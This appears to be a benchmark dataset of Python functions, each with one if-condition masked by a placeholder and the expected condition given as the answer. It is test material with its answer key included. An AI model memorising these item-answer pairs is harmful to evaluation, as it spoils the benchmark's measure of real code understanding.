2055,"def PARSE_TWO_PARAMS(x, y):<tab>""""""used to convert different possible x/y params to a tuple""""""<tab>if y is not None:<tab><tab>return (x, y)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return (x[0], x[1])<tab><tab>else:<tab><tab><tab>if isinstance(x, UNIVERSAL_STRING):<tab><tab><tab><tab>x = x.strip()<tab><tab><tab><tab>if "","" in x:<tab><tab><tab><tab><tab>return [int(w.strip()) for w in x.split("","")]<tab><tab><tab>return (x, x)","if isinstance ( x , ( list , tuple ) ) :",147
2056,"def cancel_spot_fleet_requests(self, spot_fleet_request_ids, terminate_instances):<tab>spot_requests = []<tab>for spot_fleet_request_id in spot_fleet_request_ids:<tab><tab>spot_fleet = self.spot_fleet_requests[spot_fleet_request_id]<tab><tab><IF-STMT><tab><tab><tab>spot_fleet.target_capacity = 0<tab><tab><tab>spot_fleet.terminate_instances()<tab><tab>spot_requests.append(spot_fleet)<tab><tab>del self.spot_fleet_requests[spot_fleet_request_id]<tab>return spot_requests",if terminate_instances :,145
2057,"def pop(self, key, default=_MISSING):<tab># NB: hit/miss counts are bypassed for pop()<tab>with self._lock:<tab><tab>try:<tab><tab><tab>ret = super(LRI, self).pop(key)<tab><tab>except KeyError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>ret = default<tab><tab>else:<tab><tab><tab>self._remove_from_ll(key)<tab><tab>return ret",if default is _MISSING :,108
2058,"def _remove_optional_none_type_hints(self, type_hints, defaults):<tab># If argument has None as a default, typing.get_type_hints adds<tab># optional None to the information it returns. We don't want that.<tab>for arg in defaults:<tab><tab>if defaults[arg] is None and arg in type_hints:<tab><tab><tab>type_ = type_hints[arg]<tab><tab><tab>if self._is_union(type_):<tab><tab><tab><tab>types = type_.__args__<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>type_hints[arg] = types[0]",if len ( types ) == 2 and types [ 1 ] is type ( None ) :,157
2059,"def reader(self, myself):<tab>ok = True<tab>line = """"<tab>while True:<tab><tab>line = sys.stdin.readline().strip()<tab><tab>if ok:<tab><tab><tab>if not line:<tab><tab><tab><tab>ok = False<tab><tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>ok = True<tab><tab>self.Q.append(line)<tab>os.kill(myself, signal.SIGTERM)",elif not line :,112
2060,"def checkout_branch(self, branch):<tab>if branch in self.remote_branches:<tab><tab>sickrage.app.log.debug(<tab><tab><tab>""Branch checkout: "" + self._find_installed_version() + ""->"" + branch<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab># remove untracked files and performs a hard reset on git branch to avoid update issues<tab><tab>if sickrage.app.config.git_reset:<tab><tab><tab>self.reset()<tab><tab># fetch all branches<tab><tab>self.fetch()<tab><tab>__, __, exit_status = self._git_cmd(self._git_path, ""checkout -f "" + branch)<tab><tab>if exit_status == 0:<tab><tab><tab>return True<tab>return False",if not self . install_requirements ( self . current_branch ) :,194
2061,"def last_ok(nodes):<tab>for i in range(len(nodes) - 1, -1, -1):<tab><tab>if ok_node(nodes[i]):<tab><tab><tab>node = nodes[i]<tab><tab><tab>if isinstance(node, ast.Starred):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return node.value<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>return None<tab><tab><tab>else:<tab><tab><tab><tab>return nodes[i]<tab>return None",if ok_node ( node . value ) :,122
2062,"def restart():<tab>""""""Restart application.""""""<tab>popen_list = [sys.executable, app.MY_FULLNAME]<tab>if not app.NO_RESTART:<tab><tab>popen_list += app.MY_ARGS<tab><tab><IF-STMT><tab><tab><tab>popen_list += [""--nolaunch""]<tab><tab>logger.info(""Restarting Medusa with {options}"", options=popen_list)<tab><tab># shutdown the logger to make sure it's released the logfile BEFORE it restarts Medusa.<tab><tab>logging.shutdown()<tab><tab>print(popen_list)<tab><tab>subprocess.Popen(popen_list, cwd=os.getcwd())","if ""--nolaunch"" not in popen_list :",154
2063,"def StopBackgroundWorkload(self):<tab>""""""Stop the background workoad.""""""<tab>for workload in background_workload.BACKGROUND_WORKLOADS:<tab><tab>if workload.IsEnabled(self):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise NotImplementedError()<tab><tab><tab>workload.Stop(self)",if self . OS_TYPE in workload . EXCLUDED_OS_TYPES :,87
2064,"def __init__(self, token):<tab>self._convert_to_ascii = False<tab>self._find = None<tab>if token.search is None:<tab><tab>return<tab>flags = 0<tab>self._match_this_many = 1<tab>if token.options:<tab><tab>if ""g"" in token.options:<tab><tab><tab>self._match_this_many = 0<tab><tab><IF-STMT><tab><tab><tab>flags |= re.IGNORECASE<tab><tab>if ""a"" in token.options:<tab><tab><tab>self._convert_to_ascii = True<tab>self._find = re.compile(token.search, flags | re.DOTALL)<tab>self._replace = _CleverReplace(token.replace)","if ""i"" in token . options :",170
2065,"def _draw_nodes(self, cr, bounding, highlight_items):<tab>highlight_nodes = []<tab>for element in highlight_items:<tab><tab><IF-STMT><tab><tab><tab>highlight_nodes.append(element.src)<tab><tab><tab>highlight_nodes.append(element.dst)<tab><tab>else:<tab><tab><tab>highlight_nodes.append(element)<tab>for node in self.nodes:<tab><tab>if bounding is None or node._intersects(bounding):<tab><tab><tab>node._draw(cr, highlight=(node in highlight_nodes), bounding=bounding)","if isinstance ( element , Edge ) :",134
2066,"def _removeCachedRFInfo(self, cache_key, path, removeChildPaths):<tab>log.debug(""_removeCachedRFInfo: cache_key %r, path %r"", cache_key, path)<tab>if self._cachedFiles.has_key(cache_key):<tab><tab>cache = self._cachedFiles[cache_key]<tab><tab>if cache.has_key(path):<tab><tab><tab>del cache[path]<tab><tab><IF-STMT><tab><tab><tab># Remove all cached paths that are under this directory<tab><tab><tab>from remotefilelib import addslash<tab><tab><tab>dirPath = addslash(path)<tab><tab><tab>for keypath in cache.keys():<tab><tab><tab><tab>if keypath.startswith(dirPath):<tab><tab><tab><tab><tab>del cache[keypath]",if removeChildPaths :,178
2067,"def write_row(xf, worksheet, row, row_idx, max_column):<tab>attrs = {""r"": ""%d"" % row_idx, ""spans"": ""1:%d"" % max_column}<tab>dims = worksheet.row_dimensions<tab>if row_idx in dims:<tab><tab>row_dimension = dims[row_idx]<tab><tab>attrs.update(dict(row_dimension))<tab>with xf.element(""row"", attrs):<tab><tab>for col, cell in row:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>el = write_cell(xf, worksheet, cell, cell.has_style)",if cell . _value is None and not cell . has_style and not cell . _comment :,165
2068,"def reset_feature_range(data, column_max_value, column_min_value, scale_column_idx):<tab>_data = copy.deepcopy(data)<tab>for i in scale_column_idx:<tab><tab>value = _data.features[i]<tab><tab><IF-STMT><tab><tab><tab>_data.features[i] = column_max_value[i]<tab><tab>elif value < column_min_value[i]:<tab><tab><tab>_data.features[i] = column_min_value[i]<tab>return _data",if value > column_max_value [ i ] :,135
2069,"def test_listing_all_frameworks_and_check_frameworks_by_order(self):<tab>""""""List all frameworks and check if frameworks appear by order""""""<tab>result = subprocess.check_output(self.command_as_list([UMAKE, ""--list""]))<tab>previous_framework = None<tab>for element in result.split(b""\n""):<tab><tab>if element.startswith(b""\t""):<tab><tab><tab>current_framework = element[: element.find(b"":"")]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.assertTrue(previous_framework < current_framework)<tab><tab><tab>previous_framework = current_framework<tab><tab>else:<tab><tab><tab>previous_framework = None",if previous_framework :,160
2070,"def merge(module_name, tree1, tree2):<tab>for child in tree2.node:<tab><tab><IF-STMT><tab><tab><tab>replaceFunction(tree1, child.name, child)<tab><tab>elif isinstance(child, ast.Assign):<tab><tab><tab>replaceAssign(tree1, child.nodes[0].name, child)<tab><tab>elif isinstance(child, ast.Class):<tab><tab><tab>replaceClassMethods(tree1, child.name, child)<tab><tab>else:<tab><tab><tab>raise TranslationError(<tab><tab><tab><tab>""Do not know how to merge %s"" % child, child, module_name<tab><tab><tab>)<tab>return tree1","if isinstance ( child , ast . Function ) :",159
2071,def _filter_supported_drivers():<tab>global supported_drivers<tab>with Env() as gdalenv:<tab><tab>ogrdrv_names = gdalenv.drivers().keys()<tab><tab>supported_drivers_copy = supported_drivers.copy()<tab><tab>for drv in supported_drivers.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del supported_drivers_copy[drv]<tab>supported_drivers = supported_drivers_copy,if drv not in ogrdrv_names :,110
2072,"def serialize(self, cassette_dict):<tab>for interaction in cassette_dict[""interactions""]:<tab><tab>response = interaction[""response""]<tab><tab>headers = response[""headers""]<tab><tab><IF-STMT><tab><tab><tab>rg, size, filename = self._parse_headers(headers)<tab><tab><tab>content = response[""body""][""string""]<tab><tab><tab>if rg[0] == 0 and rg[1] + 1 == size:<tab><tab><tab><tab>with open(join(self.directory, filename), ""wb"") as f:<tab><tab><tab><tab><tab>f.write(content)<tab><tab><tab>del response[""body""][""string""]<tab>return self.base_serializer.serialize(cassette_dict)","if ""Content-Range"" in headers and ""Content-Disposition"" in headers :",176
2073,"def verify_software_token(self, access_token, user_code):<tab>for user_pool in self.user_pools.values():<tab><tab>if access_token in user_pool.access_tokens:<tab><tab><tab>_, username = user_pool.access_tokens[access_token]<tab><tab><tab>user = user_pool.users.get(username)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise UserNotFoundError(username)<tab><tab><tab>user.token_verified = True<tab><tab><tab>return {""Status"": ""SUCCESS""}<tab>else:<tab><tab>raise NotAuthorizedError(access_token)",if not user :,142
2074,"def __fixdict(self, dict):<tab>for key in dict.keys():<tab><tab><IF-STMT><tab><tab><tab>tag = key[6:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if start is None:<tab><tab><tab><tab>self.elements[tag] = getattr(self, key), end<tab><tab>elif key[:4] == ""end_"":<tab><tab><tab>tag = key[4:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if end is None:<tab><tab><tab><tab>self.elements[tag] = start, getattr(self, key)","if key [ : 6 ] == ""start_"" :",162
2075,"def generate_playlist(sourcefile):<tab>""""""Generate a playlist from video titles in sourcefile""""""<tab># Hooks into this, check if the argument --description is present<tab>if ""--description"" in sourcefile or ""-d"" in sourcefile:<tab><tab>description_generator(sourcefile)<tab><tab>return<tab>expanded_sourcefile = path.expanduser(sourcefile)<tab>if not check_sourcefile(expanded_sourcefile):<tab><tab>g.message = util.F(""mkp empty"") % expanded_sourcefile<tab>else:<tab><tab>queries = read_sourcefile(expanded_sourcefile)<tab><tab>g.message = util.F(""mkp parsed"") % (len(queries), sourcefile)<tab><tab><IF-STMT><tab><tab><tab>create_playlist(queries)<tab><tab><tab>g.message = util.F(""pl help"")<tab><tab><tab>g.content = content.playlists_display()",if queries :,195
2076,"def flush(self):<tab>for record in self._unique_ordered_records:<tab><tab>record.message = self._format_string.format(<tab><tab><tab>message=record.message, count=self._message_to_count[record.message]<tab><tab>)<tab><tab># record.dispatcher is the logger who created the message,<tab><tab># it's sometimes supressed (by logbook.info for example)<tab><tab><IF-STMT><tab><tab><tab>dispatch = record.dispatcher.call_handlers<tab><tab>else:<tab><tab><tab>dispatch = dispatch_record<tab><tab>dispatch(record)<tab>self.clear()",if record . dispatcher is not None :,146
2077,"def __init__(self, name, contents):<tab>self.name = name<tab>self.all_entries = []<tab>self.attr = []<tab>self.child = []<tab>self.seq_child = []<tab>for entry in contents:<tab><tab>clean_entry = entry.rstrip(""*"")<tab><tab>self.all_entries.append(clean_entry)<tab><tab><IF-STMT><tab><tab><tab>self.seq_child.append(clean_entry)<tab><tab>elif entry.endswith(""*""):<tab><tab><tab>self.child.append(clean_entry)<tab><tab>else:<tab><tab><tab>self.attr.append(entry)","if entry . endswith ( ""**"" ) :",147
2078,"def test_empty_condition_node(cond_node):<tab>for node in [cond_node.true_node, cond_node.false_node]:<tab><tab>if node is None:<tab><tab><tab>continue<tab><tab>if type(node) is CodeNode and BaseNode.test_empty_node(node.node):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>return False<tab>return True",if BaseNode . test_empty_node ( node ) :,108
2079,"def test_deprecated_format_string(obj, fmt_str, should_raise_warning):<tab>if sys.version_info[0] == 3 and sys.version_info[1] >= 4:<tab><tab><IF-STMT><tab><tab><tab>self.assertRaises(TypeError, format, obj, fmt_str)<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>format(obj, fmt_str)<tab><tab><tab>except TypeError:<tab><tab><tab><tab>self.fail(""object.__format__ raised TypeError unexpectedly"")<tab>else:<tab><tab>with warnings.catch_warnings(record=True) as w:<tab><tab><tab>warnings.simplefilter(""always"", DeprecationWarning)<tab><tab><tab>format(obj, fmt_str)",if should_raise_warning :,168
2080,"def get_queryset(self):<tab>if self.queryset is not None:<tab><tab>return self.queryset._clone()<tab>elif self.model is not None:<tab><tab>qs = self.model._default_manager<tab><tab><IF-STMT><tab><tab><tab>access_class = access_registry[self.model]<tab><tab><tab>if access_class.select_related:<tab><tab><tab><tab>qs = qs.select_related(*access_class.select_related)<tab><tab><tab>if access_class.prefetch_related:<tab><tab><tab><tab>qs = qs.prefetch_related(*access_class.prefetch_related)<tab><tab>return qs<tab>else:<tab><tab>return super(GenericAPIView, self).get_queryset()",if self . model in access_registry :,171
2081,"def ping_task():<tab>try:<tab><tab><IF-STMT><tab><tab><tab>if peer not in self._protocol.routing_table.get_peers():<tab><tab><tab><tab>self._protocol.add_peer(peer)<tab><tab><tab>return<tab><tab>await self._protocol.get_rpc_peer(peer).ping()<tab>except (asyncio.TimeoutError, RemoteException):<tab><tab>pass",if self . _protocol . peer_manager . peer_is_good ( peer ) :,106
2082,"def _validate_usage(schema_argument, variable_used):<tab>if isinstance(schema_argument.gql_type, GraphQLNonNull) and not isinstance(<tab><tab>variable_used.type, NonNullTypeNode<tab>):<tab><tab>has_variable_a_df = not isinstance(<tab><tab><tab>variable_used.default_value, (NullValueNode, type(None))<tab><tab>)<tab><tab>has_argument_a_df = schema_argument.default_value is not None<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>return _validate_type_compatibility(<tab><tab><tab>variable_used.type, schema_argument.gql_type.gql_type<tab><tab>)<tab>return _validate_type_compatibility(variable_used.type, schema_argument.gql_type)",if not has_variable_a_df and not has_argument_a_df :,199
2083,"def _add_kid(key, x):<tab>if x is None:<tab><tab>kids[key] = None<tab>else:<tab><tab>if type(x) in (type([]), type(())):<tab><tab><tab>x1 = [i for i in x if isinstance(i, TVTKBase)]<tab><tab><tab>if x1:<tab><tab><tab><tab>kids[key] = x1<tab><tab>elif isinstance(x, TVTKBase):<tab><tab><tab><IF-STMT><tab><tab><tab><tab># Don't add iterable objects that contain non<tab><tab><tab><tab># acceptable nodes<tab><tab><tab><tab>if len(list(x)) and isinstance(list(x)[0], TVTKBase):<tab><tab><tab><tab><tab>kids[key] = x<tab><tab><tab>else:<tab><tab><tab><tab>kids[key] = x","if hasattr ( x , ""__iter__"" ) :",196
2084,"def postCreate(node, menu):<tab>with node.scriptNode().context():<tab><tab><IF-STMT><tab><tab><tab>cropFormat = node[""in""][""format""].getValue()<tab><tab>else:<tab><tab><tab>cropFormat = GafferImage.FormatPlug.getDefaultFormat(<tab><tab><tab><tab>node.scriptNode().context()<tab><tab><tab>)<tab>node[""area""].setValue(cropFormat.getDisplayWindow())","if node [ ""in"" ] . getInput ( ) :",103
2085,"def normalize_stroke(stroke):<tab>letters = set(stroke)<tab>if letters & _NUMBERS:<tab><tab><IF-STMT><tab><tab><tab>stroke = stroke.replace(system.NUMBER_KEY, """")<tab><tab># Insert dash when dealing with 'explicit' numbers<tab><tab>m = _IMPLICIT_NUMBER_RX.search(stroke)<tab><tab>if m is not None:<tab><tab><tab>start = m.start(2)<tab><tab><tab>return stroke[:start] + ""-"" + stroke[start:]<tab>if ""-"" in letters:<tab><tab>if stroke.endswith(""-""):<tab><tab><tab>stroke = stroke[:-1]<tab><tab>elif letters & system.IMPLICIT_HYPHENS:<tab><tab><tab>stroke = stroke.replace(""-"", """")<tab>return stroke",if system . NUMBER_KEY in letters :,180
2086,"def vim_k(self):<tab>""""""Cursor up N lines.""""""<tab>if self.is_text_wrapper(self.w):<tab><tab>for z in range(self.n1 * self.n):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.do(""previous-line-extend-selection"")<tab><tab><tab>else:<tab><tab><tab><tab>self.do(""previous-line"")<tab><tab>self.done()<tab>elif self.in_tree(self.w):<tab><tab>self.do(""goto-prev-visible"")<tab><tab>self.done()<tab>else:<tab><tab>self.quit()","if self . state == ""visual"" :",147
2087,"def parseTime(timeStr):<tab>regex = re.compile(constants.PARSE_TIME_REGEX)<tab>parts = regex.match(timeStr)<tab>if not parts:<tab><tab>return<tab>parts = parts.groupdict()<tab>time_params = {}<tab>for (name, param) in parts.items():<tab><tab>if param:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>time_params[""microseconds""] = int(param) * 1000<tab><tab><tab>else:<tab><tab><tab><tab>time_params[name] = int(param)<tab>return datetime.timedelta(**time_params).total_seconds()","if name == ""miliseconds"" :",146
2088,"def update(self, other=None, **kwargs):<tab>if other is not None:<tab><tab>if hasattr(other, ""items""):<tab><tab><tab>other = other.items()<tab><tab>for key, value in other:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise TensorforceError.value(<tab><tab><tab><tab><tab>name=""NestedDict.update"",<tab><tab><tab><tab><tab>argument=""key"",<tab><tab><tab><tab><tab>value=key,<tab><tab><tab><tab><tab>condition=""specified twice"",<tab><tab><tab><tab>)<tab><tab><tab>self[key] = value<tab>for key, value in kwargs.items():<tab><tab>self[key] = value",if key in kwargs :,153
2089,"def to_string(self, ostream=None, verbose=None, precedence=0):<tab>""""""Print this expression""""""<tab>if ostream is None:<tab><tab>ostream = sys.stdout<tab>_verbose = (<tab><tab>pyomo.core.base.expr_common.TO_STRING_VERBOSE if verbose is None else verbose<tab>)<tab>ostream.write(self.cname() + ""( "")<tab>first = True<tab>for arg in self._args:<tab><tab>if first:<tab><tab><tab>first = False<tab><tab><IF-STMT><tab><tab><tab>ostream.write("" , "")<tab><tab>else:<tab><tab><tab>ostream.write("", "")<tab><tab>arg.to_string(ostream=ostream, precedence=self._precedence(), verbose=verbose)<tab>ostream.write("" )"")",elif _verbose :,188
2090,"def apply_gradient_for_batch(inputs, labels, weights, loss):<tab>with tf.GradientTape() as tape:<tab><tab>outputs = self.model(inputs, training=True)<tab><tab>if isinstance(outputs, tf.Tensor):<tab><tab><tab>outputs = [outputs]<tab><tab><IF-STMT><tab><tab><tab>outputs = [outputs[i] for i in self._loss_outputs]<tab><tab>batch_loss = loss(outputs, labels, weights)<tab>if variables is None:<tab><tab>vars = self.model.trainable_variables<tab>else:<tab><tab>vars = variables<tab>grads = tape.gradient(batch_loss, vars)<tab>self._tf_optimizer.apply_gradients(zip(grads, vars))<tab>self._global_step.assign_add(1)<tab>return batch_loss",if self . _loss_outputs is not None :,193
2091,"def check_all(self, strict=False):<tab>""""""run sanity check on all keys, issue warning if out of sync""""""<tab>same = self._is_same_value<tab>for path, (orig, expected) in iteritems(self._state):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>msg = ""another library has patched resource: %r"" % path<tab><tab>if strict:<tab><tab><tab>raise RuntimeError(msg)<tab><tab>else:<tab><tab><tab>warn(msg, PasslibRuntimeWarning)","if same ( self . _get_path ( path ) , expected ) :",127
2092,"def setup_child(self, child):<tab>child.parent = self<tab>if self.document:<tab><tab>child.document = self.document<tab><tab>if child.source is None:<tab><tab><tab>child.source = self.document.current_source<tab><tab><IF-STMT><tab><tab><tab>child.line = self.document.current_line",if child . line is None :,84
2093,"def shift_expr(self, nodelist):<tab># shift_expr ('<<'|'>>' shift_expr)*<tab>node = self.com_node(nodelist[0])<tab>for i in range(2, len(nodelist), 2):<tab><tab>right = self.com_node(nodelist[i])<tab><tab>if nodelist[i - 1][0] == token.LEFTSHIFT:<tab><tab><tab>node = LeftShift([node, right], lineno=nodelist[1][2])<tab><tab><IF-STMT><tab><tab><tab>node = RightShift([node, right], lineno=nodelist[1][2])<tab><tab>else:<tab><tab><tab>raise ValueError(""unexpected token: %s"" % nodelist[i - 1][0])<tab>return node",elif nodelist [ i - 1 ] [ 0 ] == token . RIGHTSHIFT :,178
2094,"def styleRow(self, row, selected):<tab>if row != -1:<tab><tab><IF-STMT><tab><tab><tab>self.getRowFormatter().addStyleName(row, ""midpanel-SelectedRow"")<tab><tab>else:<tab><tab><tab>self.getRowFormatter().removeStyleName(row, ""midpanel-SelectedRow"")",if selected :,76
2095,"def __call__(self, img):<tab>img = self.topil(img)<tab>ops = random.choices(self.augment_list, k=self.n)<tab>for op, minval, maxval in ops:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>val = (float(self.m) / 30) * float(maxval - minval) + minval<tab><tab>img = op(img, val)<tab>return img","if random . random ( ) > random . uniform ( 0.2 , 0.8 ) :",116
2096,"def run(self, **inputs):<tab>if self.inputs.copy_inputs:<tab><tab>self.inputs.subjects_dir = os.getcwd()<tab><tab><IF-STMT><tab><tab><tab>inputs[""subjects_dir""] = self.inputs.subjects_dir<tab><tab>copy2subjdir(self, self.inputs.surface, ""surf"")<tab><tab>copy2subjdir(self, self.inputs.curvfile1, ""surf"")<tab><tab>copy2subjdir(self, self.inputs.curvfile2, ""surf"")<tab>return super(CurvatureStats, self).run(**inputs)","if ""subjects_dir"" in inputs :",146
2097,"def get_func_name(obj):<tab>if inspect.ismethod(obj):<tab><tab>match = RE_BOUND_METHOD.match(repr(obj))<tab><tab>if match:<tab><tab><tab>cls = match.group(""class"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return match.group(""name"")<tab><tab><tab>return ""%s.%s"" % (match.group(""class""), match.group(""name""))<tab>return None",if not cls :,102
2098,"def local_path_export(at_start=True, env_cmd=None):<tab>""""""Retrieve paths to local install, also including environment paths if env_cmd included.""""""<tab>paths = [get_bcbio_bin()]<tab>if env_cmd:<tab><tab>env_path = os.path.dirname(get_program_python(env_cmd))<tab><tab><IF-STMT><tab><tab><tab>paths.insert(0, env_path)<tab>if at_start:<tab><tab>return 'export PATH=%s:""$PATH"" && ' % ("":"".join(paths))<tab>else:<tab><tab>return 'export PATH=""$PATH"":%s && ' % ("":"".join(paths))",if env_path not in paths :,161
2099,"def copystat(src, dst):<tab>""""""Copy all stat info (mode bits, atime, mtime, flags) from src to dst""""""<tab>st = os.stat(src)<tab>mode = stat.S_IMODE(st.st_mode)<tab>if hasattr(os, ""utime""):<tab><tab>os.utime(dst, (st.st_atime, st.st_mtime))<tab>if hasattr(os, ""chmod""):<tab><tab>os.chmod(dst, mode)<tab>if hasattr(os, ""chflags"") and hasattr(st, ""st_flags""):<tab><tab>try:<tab><tab><tab>os.chflags(dst, st.st_flags)<tab><tab>except OSError as why:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise","if not hasattr ( errno , ""EOPNOTSUPP"" ) or why . errno != errno . EOPNOTSUPP :",193
2100,"def _asdict(self, *, to_string: bool = False) -> dict:<tab>res = []<tab>for key in self._keys:<tab><tab>value = getattr(self, key)<tab><tab>if isinstance(value, Struct):<tab><tab><tab>value = value._asdict(to_string=to_string)<tab><tab><IF-STMT><tab><tab><tab>value = str(value)<tab><tab>res.append((key, value))<tab>return dict(res)",elif to_string :,108
2101,"def _SI(size, K=1024, i=""i""):<tab>""""""Return size as SI string.""""""<tab>if 1 < K <= size:<tab><tab>f = float(size)<tab><tab>for si in iter(""KMGPTE""):<tab><tab><tab>f /= K<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return "" or %.1f %s%sB"" % (f, si, i)<tab>return """"",if f < K :,99
2102,"def _flatten(*args):<tab>arglist = []<tab>for arg in args:<tab><tab><IF-STMT><tab><tab><tab>if arg.vhdl_code is not None:<tab><tab><tab><tab>arglist.append(arg.vhdl_code)<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>arg = arg.subs<tab><tab>if id(arg) in _userCodeMap[""vhdl""]:<tab><tab><tab>arglist.append(_userCodeMap[""vhdl""][id(arg)])<tab><tab>elif isinstance(arg, (list, tuple, set)):<tab><tab><tab>for item in arg:<tab><tab><tab><tab>arglist.extend(_flatten(item))<tab><tab>else:<tab><tab><tab>arglist.append(arg)<tab>return arglist","if isinstance ( arg , _Block ) :",179
2103,"def new_token(self):<tab>data = '{{""username"": ""{}"", ""password"": ""{}""}}'.format(self.username, self.password)<tab>try:<tab><tab>resp = requests.post(<tab><tab><tab>""https://api.zoomeye.org/user/login"",<tab><tab><tab>data=data,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>content = resp.json()<tab><tab><tab>self.token = content[""access_token""]<tab><tab><tab>self.headers = {""Authorization"": ""JWT %s"" % self.token}<tab><tab><tab>return True<tab>except Exception as ex:<tab><tab>logger.error(str(ex))<tab>return False","if resp . status_code != 401 and ""access_token"" in resp . json ( ) :",173
2104,"def finalize_computation(<tab>self, transaction: SignedTransactionAPI, computation: ComputationAPI) -> ComputationAPI:<tab>computation = super().finalize_computation(transaction, computation)<tab>#<tab># EIP161 state clearing<tab>#<tab>touched_accounts = collect_touched_accounts(computation)<tab>for account in touched_accounts:<tab><tab>should_delete = self.vm_state.account_exists(<tab><tab><tab>account<tab><tab>) and self.vm_state.account_is_empty(account)<tab><tab><IF-STMT><tab><tab><tab>self.vm_state.logger.debug2(<tab><tab><tab><tab>""CLEARING EMPTY ACCOUNT: %s"",<tab><tab><tab><tab>encode_hex(account),<tab><tab><tab>)<tab><tab><tab>self.vm_state.delete_account(account)<tab>return computation",if should_delete :,195
2105,"def send_messages(self, text, user_ids):<tab>broken_items = []<tab>if not user_ids:<tab><tab>self.logger.info(""User must be at least one."")<tab><tab>return broken_items<tab>self.logger.info(""Going to send %d messages."" % (len(user_ids)))<tab>for user in tqdm(user_ids):<tab><tab><IF-STMT><tab><tab><tab>self.error_delay()<tab><tab><tab>broken_items = user_ids[user_ids.index(user) :]<tab><tab><tab>break<tab>return broken_items","if not self . send_message ( text , user ) :",144
2106,"def editable_cpp_info(self):<tab>if self._layout_file:<tab><tab><IF-STMT><tab><tab><tab>return EditableLayout(self._layout_file)<tab><tab>else:<tab><tab><tab>raise ConanException(""Layout file not found: %s"" % self._layout_file)",if os . path . isfile ( self . _layout_file ) :,79
2107,"def to_python(self, value):<tab>if isinstance(value, list) and len(value) == 2 and isinstance(value[0], str):<tab><tab>filename, payload = value<tab><tab>try:<tab><tab><tab>payload = base64.b64decode(payload)<tab><tab>except TypeError:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.storage.delete(filename)<tab><tab><tab>self.storage.save(filename, ContentFile(payload))<tab><tab><tab>return filename<tab>return value",if self . storage . exists ( filename ) :,131
2108,"def update_defaults(self, *values, **kwargs):<tab>for value in values:<tab><tab>if type(value) == dict:<tab><tab><tab>self.DEFAULT_CONFIGURATION.update(value)<tab><tab><IF-STMT><tab><tab><tab>self.__defaults_from_module(value)<tab><tab>elif isinstance(value, str):<tab><tab><tab>if os.path.exists(value):<tab><tab><tab><tab>self.__defaults_from_file(value)<tab><tab><tab>else:<tab><tab><tab><tab>logger.warning(""Configuration file {} does not exist."".format(value))<tab><tab>elif isinstance(value, type(None)):<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise ValueError(""Cannot interpret {}"".format(value))<tab>self.DEFAULT_CONFIGURATION.update(kwargs)","elif isinstance ( value , types . ModuleType ) :",184
2109,"def __getitem__(self, item: str) -> Any:<tab>try:<tab><tab>return self.data[item]<tab>except KeyError:<tab><tab>for g in self.extended_groups():<tab><tab><tab>try:<tab><tab><tab><tab>r = g.data[item]<tab><tab><tab><tab>return r<tab><tab><tab>except KeyError:<tab><tab><tab><tab>continue<tab><tab>r = self.defaults.data.get(item)<tab><tab><IF-STMT><tab><tab><tab>return r<tab><tab>raise",if r is not None :,118
2110,"def _parse_arguments(self, handler_method):<tab>spec = DynamicArgumentParser().parse(self._argspec, self.longname)<tab>if not self._supports_kwargs:<tab><tab>if spec.kwargs:<tab><tab><tab>raise DataError(<tab><tab><tab><tab>""Too few '%s' method parameters for **kwargs ""<tab><tab><tab><tab>""support."" % self._run_keyword_method_name<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise DataError(<tab><tab><tab><tab>""Too few '%s' method parameters for ""<tab><tab><tab><tab>""keyword-only arguments support."" % self._run_keyword_method_name<tab><tab><tab>)<tab>spec.types = GetKeywordTypes(self.library.get_instance())(self._handler_name)<tab>return spec",if spec . kwonlyargs :,183
2111,"def test_orphans_match(self):<tab>""""""api handles last three chars match query""""""<tab>response = self.client.get(""%s?q=%s"" % (self.api_link, self.user.username[-3:]))<tab>self.assertEqual(response.status_code, 200)<tab>response_json = response.json()<tab>self.assertIn(""users"", [p[""id""] for p in response_json])<tab>for provider in response_json:<tab><tab><IF-STMT><tab><tab><tab>results = provider[""results""][""results""]<tab><tab><tab>self.assertEqual(len(results), 1)<tab><tab><tab>self.assertEqual(results[0][""id""], self.user.id)","if provider [ ""id"" ] == ""users"" :",164
2112,"def test_costs_1D_noisy_names(signal_bkps_1D_noisy, cost_name):<tab>signal, bkps = signal_bkps_1D_noisy<tab>cost = cost_factory(cost_name)<tab>cost.fit(signal)<tab>cost.fit(signal.flatten())<tab>cost.error(0, 100)<tab>cost.error(100, signal.shape[0])<tab>cost.error(10, 50)<tab>cost.sum_of_costs(bkps)<tab>with pytest.raises(NotEnoughPoints):<tab><tab><IF-STMT><tab><tab><tab>cost.min_size = 4<tab><tab><tab>cost.error(1, 2)<tab><tab>else:<tab><tab><tab>cost.error(1, 2)","if cost_name == ""cosine"" :",184
